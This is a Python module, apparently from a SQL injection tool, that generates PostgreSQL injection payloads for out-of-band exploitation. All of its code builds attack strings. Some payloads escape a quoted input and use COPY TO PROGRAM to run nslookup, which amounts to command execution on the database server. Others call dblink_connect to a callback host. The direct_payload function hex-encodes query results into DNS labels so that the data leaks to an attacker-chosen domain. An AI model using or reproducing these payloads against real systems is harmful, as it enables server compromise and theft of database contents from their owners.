def substring(name: str, expression: str, pos: int) -> str:
    return f"substr(({expression}),{pos},1)"


def payload(name: str, base: str, condition: str, callback_host: str) -> str:
    if name == "postgres-program":
        escaped = callback_host.replace("'", "'\"'\"'")
        return (
            f"{base}';DO $$ BEGIN IF ({condition}) THEN "
            f"COPY (SELECT '') TO PROGRAM 'nslookup {escaped}'; "
            f"END IF; END $$;--"
        )
    if name == "postgres-dblink":
        return (
            f"{base}';SELECT CASE WHEN {condition} THEN "
            f"dblink_connect('host={callback_host} user=a password=a dbname=a') "
            f"ELSE NULL END::text--"
        )
    raise ValueError(f"unknown profile: {name}")


def payloads_full(name: str, base: str, condition: str, callback_host: str) -> list[str]:
    if name == "postgres-program":
        escaped = callback_host.replace("'", "'\"'\"'")
        return list(dict.fromkeys([
            payload(name, base, condition, callback_host),
            f"{base}';COPY (SELECT '') TO PROGRAM 'nslookup {escaped}'--",
        ]))
    if name == "postgres-dblink":
        return list(dict.fromkeys([
            payload(name, base, condition, callback_host),
            (
                f"{base}';SELECT dblink_connect('oob', 'host={callback_host} "
                "user=a password=a dbname=a') WHERE "
                f"{condition}--"
            ),
        ]))
    raise ValueError(f"unknown profile: {name}")


def direct_payload(name: str, base: str, expression: str, prefix: str, domain: str) -> str | None:
    host = f"{prefix}.{domain}"
    if name == "postgres-dblink":
        h = f"encode(({expression})::bytea,'hex')"
        split = (
            f"substring({h},1,62)"
            f"||CASE WHEN length({h})>62 THEN '.'"
            f"||substring({h},63,62) ELSE '' END"
            f"||CASE WHEN length({h})>124 THEN '.'"
            f"||substring({h},125,62) ELSE '' END"
            f"||CASE WHEN length({h})>186 THEN '.'"
            f"||substring({h},187,62) ELSE '' END"
        )
        return (
            f"{base}';SELECT dblink_connect('host='||{split}||"
            f"'.{host} user=a password=a dbname=a')--"
        )
    if name == "postgres-program":
        esc = host.replace("'", "'\"'\"'")
        h = f"encode(({expression})::bytea,'hex')"
        split = (
            f"substring({h},1,62)"
            f"||CASE WHEN length({h})>62 THEN '.'||substring({h},63,62) ELSE '' END"
            f"||CASE WHEN length({h})>124 THEN '.'||substring({h},125,62) ELSE '' END"
            f"||CASE WHEN length({h})>186 THEN '.'||substring({h},187,62) ELSE '' END"
        )
        return (
            f"{base}';DO $$ DECLARE v TEXT; BEGIN "
            f"SELECT {split} INTO v; "
            f"EXECUTE 'COPY (SELECT 1) TO PROGRAM ''nslookup '' || v || ''.{esc}'''; "
            f"END $$;--"
        )
    return None


def direct_payloads_full(
    name: str, base: str, expression: str, prefix: str, domain: str, payload: str
) -> list[str]:
    if name == "postgres-program":
        return list(dict.fromkeys([payload]))
    return [payload]
